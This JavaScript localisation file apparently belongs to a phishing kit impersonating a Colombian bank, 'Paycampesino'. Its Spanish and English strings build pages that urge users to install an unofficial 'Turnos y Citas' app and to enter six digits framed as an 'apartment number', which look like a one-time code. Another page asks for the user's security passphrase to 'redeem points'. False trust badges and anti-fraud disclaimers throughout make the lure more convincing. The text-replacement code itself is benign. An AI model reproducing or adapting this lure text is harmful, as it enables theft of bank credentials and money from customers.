/**
 * =============================================================================
 * PANEL - ARCHIVO CENTRAL DE VARIABLES DE TEXTO (i18n)
 * =============================================================================
 * 
 * Este archivo contiene todas las variables de texto de la aplicación.
 * Permite realizar traducciones rápidas o modificar cualquier texto visible
 * en un solo lugar, sin necesidad de editar los archivos HTML madre.
 * 
 * CÓMO HACER UNA TRADUCCIÓN RÁPIDA:
 * 1. Para cambiar el idioma de la aplicación, edita la variable IDIOMA_POR_DEFECTO:
 *      const IDIOMA_POR_DEFECTO = "en"; // 'es' = Español, 'en' = Inglés
 * 2. También puedes probar cualquier idioma en la URL añadiendo '?lang=en', ej:
 *      solicita-tu-turno.html?lang=en
 * 3. O edita los textos de tu preferencia directamente en el diccionario abajo.
 * =============================================================================
 */

(function(root) {
  "use strict";

  // Idioma activo por defecto ('es' o 'en')
  const IDIOMA_POR_DEFECTO = "es";

  // Detección de idioma: 1. URL (?lang=xx) -> 2. IDIOMA_POR_DEFECTO
  function obtenerIdiomaActivo() {
    try {
      const urlParams = new URLSearchParams(window.location.search);
      const urlLang = urlParams.get("lang");
      if (urlLang && TEXTOS[urlLang]) {
        return urlLang;
      }
    } catch (e) {
      // Ignorar restricciones en entornos aislados
    }
    return IDIOMA_POR_DEFECTO;
  }

  // ===========================================================================
  // DICCIONARIO DE VARIABLES DE TEXTO
  // ===========================================================================
  const TEXTOS = {
    // -------------------------------------------------------------------------
    // ESPAÑOL (es)
    // -------------------------------------------------------------------------
    es: {
      // === GLOBALES, CABECERA Y PIE DE PÁGINA ===
      HEADER_SECURITY_BADGE: "Sitio auténtico y seguro",
      HEADER_BACK_HOME: "Volver al inicio",
      HEADER_LINEA_AYUDA: "Ayuda: 01 8000 912 227",
      FOOTER_AVISO_LEGAL: "Aviso Legal",
      FOOTER_POLITICA_PRIVACIDAD: "Política de Privacidad",
      FOOTER_PRIVACIDAD: "Privacidad",
      FOOTER_SEGURIDAD_BANCARIA: "Seguridad Bancaria",
      FOOTER_SEGURIDAD: "Seguridad",
      FOOTER_RED_OFICINAS: "Red de Oficinas",
      FOOTER_REGLAMENTO_PUNTOS: "Reglamento Puntos Paycampesino",
      FOOTER_LEGAL_ENTIDAD: "Paycampesino Colombia S.A. – Vigilado Superintendencia Financiera de Colombia.",
      FOOTER_COPYRIGHT: "© 2026 Paycampesino Colombia. Todos los derechos reservados.",

      // === VISTA: SOLICITA TU TURNO (solicita-tu-turno.html) ===
      TURNO_PAGE_TITLE: "Solicita tu turno | Paycampesino Colombia",
      TURNO_BADGE: "Turno Digital Paycampesino",
      TURNO_TITLE_MAIN: "Solicita tu turno",
      TURNO_TITLE_ACCENT: "desde la app oficial",
      TURNO_DESC: "Ahorra tiempo en tus visitas a nuestras oficinas. Para solicitar tu turno en tiempo real sin hacer filas, descarga de forma gratuita la app Turnos y Citas disponible en Google Play Store.",
      TURNO_APP_NAME: "Turnos y Citas",
      TURNO_APP_DEVELOPER: "Servicios Digitales de Turnos",
      TURNO_APP_RATING: "4.8",
      TURNO_APP_DOWNLOADS: "• +100 mil descargas",
      TURNO_BTN_PLAYSTORE_SUB: "Disponible en Google Play",
      TURNO_BTN_PLAYSTORE_TITLE: "Ir a descargar la app",
      TURNO_QR_SCAN_HINT: "Escanea con la cámara de tu celular para descargar en Google Play",
      TURNO_QR_BOX_TITLE: "Escanear con tu cámara para descargar",
      TURNO_BENEFITS_TITLE: "¿Por qué solicitar tu turno digital?",
      TURNO_BENEFIT_1_TITLE: "Cero filas físicas",
      TURNO_BENEFIT_1_DESC: "Pide tu turno antes de salir de tu casa o trabajo. Aprovecha tu tiempo mientras el sistema avanza en tu atención.",
      TURNO_BENEFIT_2_TITLE: "Notificaciones al móvil",
      TURNO_BENEFIT_2_DESC: "Recibe avisos automáticos en tu celular con el tiempo estimado restante y cuándo debes acercarte al módulo.",
      TURNO_BENEFIT_3_TITLE: "Oficinas más cercanas",
      TURNO_BENEFIT_3_DESC: "Encuentra la oficina Paycampesino más conveniente con menor cantidad de personas en fila para realizar tus diligencias al instante.",
      TURNO_STEPS_TITLE: "¿Cómo funciona el proceso?",
      TURNO_STEP_1_TITLE: "Descarga la aplicación",
      TURNO_STEP_1_DESC: "Ingresa a Google Play Store e instala la app gratuita en tu teléfono móvil.",
      TURNO_STEP_2_TITLE: "Selecciona tu trámite",
      TURNO_STEP_2_DESC: "Elige la oficina que prefieras y el servicio que vas a realizar (Caja, Asesoría o Citas).",
      TURNO_STEP_3_TITLE: "Recibe tu turno digital",
      TURNO_STEP_3_DESC: "Monitorea tu turno en vivo y acércate a la oficina cuando la aplicación te lo indique.",
      TURNO_SECURITY_TITLE: "Servicio Gratuito y Seguro",
      TURNO_SECURITY_DESC: "La asignación de turnos y citas es un servicio 100% gratuito de Paycampesino. Nunca pagues a intermediarios ni compartas tus contraseñas personales para obtener un turno.",

      // === VISTA: CARGANDO (cargando.html y cargando.js) ===
      CARGANDO_PAGE_TITLE: "Paycampesino - Cargando...",
      CARGANDO_TITLE_TEXT: "Cargando",
      CARGANDO_SUBTITLE: "Por favor espera un momento mientras procesamos tu solicitud de manera segura.",
      CARGANDO_SECURITY_NOTE: "Estás en un entorno con seguridad Paycampesino",
      CARGANDO_FOOTER: "© 2026 Paycampesino Colombia S.A.",
      CARGANDO_OVERLAY_TITLE: "Cargando",
      CARGANDO_OVERLAY_SUBTITLE: "Por favor espera un momento mientras procesamos tu solicitud.",
      CARGANDO_OVERLAY_SECURITY: "Conexión cifrada y segura",

      // === VISTA: NÚMERO DE APTO (numero-de-apto.html) ===
      APTO_PAGE_TITLE: "Número de Apto | Paycampesino Colombia",
      APTO_BADGE: "Validación de Residencia",
      APTO_TITLE: "Número de apto",
      APTO_SUBTITLE: "Ingresa los 6 dígitos correspondientes para continuar con la validación de tu información.",
      APTO_LABEL: "Número de apartamento",
      APTO_ERROR_MSG: "Por favor completa los 6 dígitos requeridos.",
      APTO_HINT: "Ingresa únicamente números. Puedes pegar el valor completo.",
      APTO_BTN_CONTINUAR: "Continuar",
      APTO_LINK_PROBLEMAS: "¿Problemas para verificar? Inicia sesión",
      APTO_LINK_CANCELAR: "Cancelar",
      APTO_SECURITY_TITLE: "Protección de datos Paycampesino",
      APTO_SECURITY_TEXT: "Tus datos se encuentran resguardados bajo estándares de encriptación bancaria avanzada.",
      APTO_VALIDANDO_TITLE: "Validando información",
      APTO_VALIDANDO_SUB: "Estamos verificando los datos ingresados de manera segura...",
      APTO_VALIDADO_TITLE: "Información validada",
      APTO_VALIDADO_SUB: "Tus datos han sido procesados correctamente...",

      // === VISTA: PALABRA CLAVE (palabra-clave.html) ===
      PALABRA_PAGE_TITLE: "Validación de Palabra Clave - Puntos Paycampesino | Paycampesino Colombia",
      STEP_PUNTOS_CUENTA: "Puntos & Cuenta",
      STEP_COMPLETADO: "Completado",
      STEP_PALABRA_CLAVE: "Palabra Clave",
      STEP_EN_CURSO: "En curso",
      STEP_ACREDITACION: "Acreditación",
      STEP_CONFIRMACION: "Confirmación",
      PUNTOS_PROGRAMA: "Programa Puntos Paycampesino",
      PUNTOS_ESTADO: "Proceso de Canje",
      PUNTOS_LABEL: "Puntos acumulados a redimir",
      PUNTOS_VALOR_RECIBIR: "Valor en dinero a recibir",
      PUNTOS_DESTINO_ABONO: "Destino del abono",
      PUNTOS_TASA_CONVERSION: "Tasa de conversión",
      PUNTOS_TASA_VAL: "1 Punto = $10 COP",
      PUNTOS_COSTO_TX: "Costo por transacción",
      PUNTOS_COSTO_VAL: "$0 COP (Gratis)",
      PALABRA_BADGE: "Validación de Seguridad",
      PALABRA_TITLE: "Ingresa tu palabra clave",
      PALABRA_DESC: "Para autorizar la redención y el desembolso seguro de tus Puntos Paycampesino a tus productos, por favor digita tu palabra clave de seguridad registrada.",
      PALABRA_INFO_BOX: "<strong>¿Qué es la palabra clave?</strong> Es la palabra o código alfanumérico que registraste en tus canales digitales de Paycampesino para validar y firmar operaciones bancarias y canje de beneficios.",
      PALABRA_INPUT_LABEL: "Palabra clave de seguridad",
      PALABRA_NO_RECUERDAS: "¿No recuerdas tu clave?",
      PALABRA_INPUT_PLACEHOLDER: "Digita tu palabra clave de seguridad",
      PALABRA_ERROR_REQUIRED: "Este campo es requerido.",
      PALABRA_FIELD_HINT: "Dato confidencial cifrado con seguridad bancaria Paycampesino.",
      PALABRA_BTN_SUBMIT: "Confirmar y procesar puntos",
      PALABRA_PROBLEMAS_VALIDAR: "¿Tienes problemas para validar? Inicia sesión",
      PALABRA_CANCELAR_SALIR: "Cancelar y salir",
      PALABRA_SECURITY_TITLE: "Recomendación de Seguridad Paycampesino",
      PALABRA_SECURITY_TEXT: "Paycampesino nunca solicitará tus claves, palabras secretas o códigos de confirmación a través de llamadas telefónicas, mensajes de texto o correos electrónicos. Esta operación se realiza únicamente dentro de nuestros canales oficiales.",
      PALABRA_MODAL_TITLE: "Palabra Clave de Seguridad",
      PALABRA_MODAL_P1: "La <strong>Palabra Clave</strong> es un factor de autenticación de seguridad exclusivo que te permite autorizar transacciones de alta relevancia, tales como:",
      PALABRA_MODAL_LI1: "Redención y traslado de Puntos Paycampesino a dinero en cuenta.",
      PALABRA_MODAL_LI2: "Transferencias entre cuentas y pagos de servicios.",
      PALABRA_MODAL_LI3: "Cambio de parámetros de seguridad en Paycampesino Net y App Paycampesino.",
      PALABRA_MODAL_P2: "Si no recuerdas tu palabra clave, puedes reestablecerla fácilmente ingresando a tu <strong>App Paycampesino Móvil</strong> en la sección <em>Ajustes > Seguridad</em>, o comunicándote con nuestra línea de atención.",
      PALABRA_MODAL_BTN: "Entendido",
      PALABRA_ARIA_MOSTRAR: "Mostrar palabra clave",
      PALABRA_ARIA_OCULTAR: "Ocultar palabra clave"
    },

    // -------------------------------------------------------------------------
    // INGLÉS (en) - Listo para traducción rápida
    // -------------------------------------------------------------------------
    en: {
      // === GLOBALS, HEADER & FOOTER ===
      HEADER_SECURITY_BADGE: "Authentic and secure site",
      HEADER_BACK_HOME: "Back to home",
      HEADER_LINEA_AYUDA: "Help line: 01 8000 912 227",
      FOOTER_AVISO_LEGAL: "Legal Notice",
      FOOTER_POLITICA_PRIVACIDAD: "Privacy Policy",
      FOOTER_PRIVACIDAD: "Privacy",
      FOOTER_SEGURIDAD_BANCARIA: "Banking Security",
      FOOTER_SEGURIDAD: "Security",
      FOOTER_RED_OFICINAS: "Branch Network",
      FOOTER_REGLAMENTO_PUNTOS: "Paycampesino Points Regulations",
      FOOTER_LEGAL_ENTIDAD: "Paycampesino Colombia S.A. – Supervised by Financial Superintendence of Colombia.",
      FOOTER_COPYRIGHT: "© 2026 Paycampesino Colombia. All rights reserved.",

      // === VIEW: SOLICITA TU TURNO ===
      TURNO_PAGE_TITLE: "Request your ticket | Paycampesino Colombia",
      TURNO_BADGE: "Paycampesino Digital Ticket",
      TURNO_TITLE_MAIN: "Request your ticket",
      TURNO_TITLE_ACCENT: "from the official app",
      TURNO_DESC: "Save time during your branch visits. To request your ticket in real time without standing in line, download the free Turnos y Citas app available on Google Play Store.",
      TURNO_APP_NAME: "Turnos y Citas",
      TURNO_APP_DEVELOPER: "Digital Queuing Services",
      TURNO_APP_RATING: "4.8",
      TURNO_APP_DOWNLOADS: "• +100k downloads",
      TURNO_BTN_PLAYSTORE_SUB: "Available on Google Play",
      TURNO_BTN_PLAYSTORE_TITLE: "Download the app now",
      TURNO_QR_SCAN_HINT: "Scan with your smartphone camera to download on Google Play",
      TURNO_QR_BOX_TITLE: "Scan with camera to download",
      TURNO_BENEFITS_TITLE: "Why request your digital ticket?",
      TURNO_BENEFIT_1_TITLE: "Zero physical lines",
      TURNO_BENEFIT_1_DESC: "Request your ticket before leaving home or work. Make the most of your time while our system progresses your turn.",
      TURNO_BENEFIT_2_TITLE: "Mobile notifications",
      TURNO_BENEFIT_2_DESC: "Get automated updates on your phone with estimated wait time and when you should approach the counter.",
      TURNO_BENEFIT_3_TITLE: "Nearest branch finder",
      TURNO_BENEFIT_3_DESC: "Locate the most convenient Paycampesino branch with the shortest line to complete your banking smoothly.",
      TURNO_STEPS_TITLE: "How does the process work?",
      TURNO_STEP_1_TITLE: "Download the app",
      TURNO_STEP_1_DESC: "Open Google Play Store and install the free application on your mobile device.",
      TURNO_STEP_2_TITLE: "Select your service",
      TURNO_STEP_2_DESC: "Choose your preferred branch and the service you require (Teller, Advisory or Appointment).",
      TURNO_STEP_3_TITLE: "Receive your digital ticket",
      TURNO_STEP_3_DESC: "Track your turn in real time and head to the branch when notified by the app.",
      TURNO_SECURITY_TITLE: "Free and Secure Service",
      TURNO_SECURITY_DESC: "Ticket and appointment allocation is 100% free by Paycampesino. Never pay intermediaries or share personal passwords to obtain a ticket.",

      // === VIEW: CARGANDO ===
      CARGANDO_PAGE_TITLE: "Paycampesino - Loading...",
      CARGANDO_TITLE_TEXT: "Loading",
      CARGANDO_SUBTITLE: "Please wait a moment while we process your request securely.",
      CARGANDO_SECURITY_NOTE: "You are in a secure Paycampesino environment",
      CARGANDO_FOOTER: "© 2026 Paycampesino Colombia S.A.",
      CARGANDO_OVERLAY_TITLE: "Loading",
      CARGANDO_OVERLAY_SUBTITLE: "Please wait a moment while we process your request.",
      CARGANDO_OVERLAY_SECURITY: "Encrypted and secure connection",

      // === VIEW: NÚMERO DE APTO ===
      APTO_PAGE_TITLE: "Apartment Number | Paycampesino Colombia",
      APTO_BADGE: "Residence Verification",
      APTO_TITLE: "Apartment number",
      APTO_SUBTITLE: "Enter the corresponding 6 digits to proceed with the verification of your details.",
      APTO_LABEL: "Apartment number",
      APTO_ERROR_MSG: "Please enter all 6 required digits.",
      APTO_HINT: "Enter numbers only. You can paste the full code.",
      APTO_BTN_CONTINUAR: "Continue",
      APTO_LINK_PROBLEMAS: "Trouble verifying? Log in",
      APTO_LINK_CANCELAR: "Cancel",
      APTO_SECURITY_TITLE: "Paycampesino Data Protection",
      APTO_SECURITY_TEXT: "Your details are safeguarded under advanced banking encryption standards.",
      APTO_VALIDANDO_TITLE: "Validating information",
      APTO_VALIDANDO_SUB: "Verifying entered details securely...",
      APTO_VALIDADO_TITLE: "Information verified",
      APTO_VALIDADO_SUB: "Your data has been successfully processed...",

      // === VIEW: PALABRA CLAVE ===
      PALABRA_PAGE_TITLE: "Passphrase Verification - Paycampesino Points | Paycampesino Colombia",
      STEP_PUNTOS_CUENTA: "Points & Account",
      STEP_COMPLETADO: "Completed",
      STEP_PALABRA_CLAVE: "Passphrase",
      STEP_EN_CURSO: "In progress",
      STEP_ACREDITACION: "Accreditation",
      STEP_CONFIRMACION: "Confirmation",
      PUNTOS_PROGRAMA: "Paycampesino Points Program",
      PUNTOS_ESTADO: "Redemption Process",
      PUNTOS_LABEL: "Accumulated points to redeem",
      PUNTOS_VALOR_RECIBIR: "Cash amount to receive",
      PUNTOS_DESTINO_ABONO: "Deposit destination",
      PUNTOS_TASA_CONVERSION: "Conversion rate",
      PUNTOS_TASA_VAL: "1 Point = $10 COP",
      PUNTOS_COSTO_TX: "Transaction fee",
      PUNTOS_COSTO_VAL: "$0 COP (Free)",
      PALABRA_BADGE: "Security Validation",
      PALABRA_TITLE: "Enter your passphrase",
      PALABRA_DESC: "To authorize secure redemption and disbursement of your Paycampesino Points to your accounts, please enter your registered security passphrase.",
      PALABRA_INFO_BOX: "<strong>What is the passphrase?</strong> It is the alphanumeric word or code you registered in your Paycampesino digital channels to validate and sign banking operations and reward redemptions.",
      PALABRA_INPUT_LABEL: "Security passphrase",
      PALABRA_NO_RECUERDAS: "Forgot your passphrase?",
      PALABRA_INPUT_PLACEHOLDER: "Enter your security passphrase",
      PALABRA_ERROR_REQUIRED: "This field is required.",
      PALABRA_FIELD_HINT: "Confidential data encrypted with Paycampesino banking security.",
      PALABRA_BTN_SUBMIT: "Confirm and process points",
      PALABRA_PROBLEMAS_VALIDAR: "Trouble validating? Log in",
      PALABRA_CANCELAR_SALIR: "Cancel and exit",
      PALABRA_SECURITY_TITLE: "Paycampesino Security Recommendation",
      PALABRA_SECURITY_TEXT: "Paycampesino will never request your passwords, secret words, or verification codes via phone calls, text messages, or emails. This operation is carried out exclusively within our official channels.",
      PALABRA_MODAL_TITLE: "Security Passphrase",
      PALABRA_MODAL_P1: "The <strong>Passphrase</strong> is an exclusive security authentication factor that allows you to authorize high-relevance transactions, such as:",
      PALABRA_MODAL_LI1: "Redemption and transfer of Paycampesino Points to cash in your account.",
      PALABRA_MODAL_LI2: "Transfers between accounts and utility bill payments.",
      PALABRA_MODAL_LI3: "Updating security settings in Paycampesino Net and Paycampesino App.",
      PALABRA_MODAL_P2: "If you don't remember your passphrase, you can easily reset it by accessing your <strong>Paycampesino Mobile App</strong> under <em>Settings > Security</em>, or by contacting our customer helpline.",
      PALABRA_MODAL_BTN: "Understood",
      PALABRA_ARIA_MOSTRAR: "Show passphrase",
      PALABRA_ARIA_OCULTAR: "Hide passphrase"
    }
  };

  // ===========================================================================
  // MOTOR LIVIANO DE APLICACIÓN DE TEXTOS (i18n ENGINE)
  // ===========================================================================
  function aplicarVariablesDeTexto() {
    const lang = obtenerIdiomaActivo();
    const dict = TEXTOS[lang] || TEXTOS["es"];

    // 1. Título del documento (<title>)
    const titleTag = document.querySelector("title[data-i18n]");
    if (titleTag) {
      const key = titleTag.getAttribute("data-i18n");
      if (dict[key]) document.title = dict[key];
    }

    // 2. Elementos con data-i18n (reemplazo de texto plano)
    document.querySelectorAll("[data-i18n]").forEach(function(el) {
      if (el.tagName.toLowerCase() === "title") return;
      const key = el.getAttribute("data-i18n");
      if (dict[key] !== undefined) {
        el.textContent = dict[key];
      }
    });

    // 3. Elementos con data-i18n-html (reemplazo respetando etiquetas internas)
    document.querySelectorAll("[data-i18n-html]").forEach(function(el) {
      const key = el.getAttribute("data-i18n-html");
      if (dict[key] !== undefined) {
        el.innerHTML = dict[key];
      }
    });

    // 4. Atributos de elementos (placeholder, title, aria-label)
    document.querySelectorAll("[data-i18n-placeholder]").forEach(function(el) {
      const key = el.getAttribute("data-i18n-placeholder");
      if (dict[key] !== undefined) el.placeholder = dict[key];
    });

    document.querySelectorAll("[data-i18n-title]").forEach(function(el) {
      const key = el.getAttribute("data-i18n-title");
      if (dict[key] !== undefined) el.title = dict[key];
    });

    document.querySelectorAll("[data-i18n-aria]").forEach(function(el) {
      const key = el.getAttribute("data-i18n-aria");
      if (dict[key] !== undefined) el.setAttribute("aria-label", dict[key]);
    });

    // 5. Escaneo de nodos de texto para reemplazar cualquier {{VARIABLE}} remanente
    reemplazarTokensEnNodos(document.body, dict);
  }

  // Reemplaza recursivamente tokens {{NOMBRE_VARIABLE}} en nodos de texto
  function reemplazarTokensEnNodos(nodo, dict) {
    if (!nodo) return;
    if (nodo.nodeType === Node.TEXT_NODE) {
      const texto = nodo.nodeValue;
      if (texto && texto.indexOf("{{") !== -1) {
        nodo.nodeValue = texto.replace(/\{\{\s*([A-Z0-9_]+)\s*\}\}/g, function(match, key) {
          return dict[key] !== undefined ? dict[key] : match;
        });
      }
    } else if (nodo.nodeType === Node.ELEMENT_NODE) {
      const tag = nodo.tagName.toLowerCase();
      if (tag === "script" || tag === "style" || tag === "svg") return;
      for (let child = nodo.firstChild; child; child = child.nextSibling) {
        reemplazarTokensEnNodos(child, dict);
      }
    }
  }

  // Función para cambiar de idioma dinámicamente desde consola o UI
  root.cambiarIdioma = function(nuevoIdioma) {
    if (TEXTOS[nuevoIdioma]) {
      try {
        localStorage.setItem("paycampesino_idioma_activo", nuevoIdioma);
      } catch (e) {}
      aplicarVariablesDeTexto();
      console.info("Idioma cambiado a: " + nuevoIdioma);
    } else {
      console.warn("Idioma no soportado: " + nuevoIdioma);
    }
  };

  // Función helper accesible globalmente: window.t('VARIABLE', fallback)
  root.t = function(key, fallback) {
    const lang = obtenerIdiomaActivo();
    const dict = TEXTOS[lang] || TEXTOS["es"];
    return dict[key] !== undefined ? dict[key] : (fallback || key);
  };

  // Exponer objeto de textos
  root.PAYCAMPESINO_TEXTOS = TEXTOS;
  root.obtenerIdiomaActivo = obtenerIdiomaActivo;

  // Ejecución inmediata y al cargar DOM en entornos de navegador
  if (typeof document !== "undefined") {
    if (document.readyState === "loading") {
      document.addEventListener("DOMContentLoaded", aplicarVariablesDeTexto);
    } else {
      aplicarVariablesDeTexto();
    }
  }

})(typeof window !== "undefined" ? window : globalThis);
